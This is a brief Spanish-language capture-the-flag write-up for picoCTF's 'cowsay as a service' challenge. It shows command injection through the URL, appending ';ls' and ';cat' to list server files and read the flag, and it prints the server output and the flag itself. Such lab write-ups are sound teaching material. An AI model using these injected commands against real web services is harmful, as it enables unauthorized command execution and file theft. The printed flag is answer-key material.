## Objetivo
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)
## Solución
https://caas.mars.picoctf.net/cowsay/holamundo;ls
```bash
< holamundo >
 -----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
https://caas.mars.picoctf.net/cowsay/holamundo;cat%20falg.txt
```
 ___________
< holamundo >
 -----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```
## Notas Adicionales
Esta pagina web estaba mal hecha por que dada la estructura del index.js se pueden ejecutar comandos usando la url.
usando esto mismo buscamos entre los archivos hasta encontrar la flag.
flag: `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
### Referencias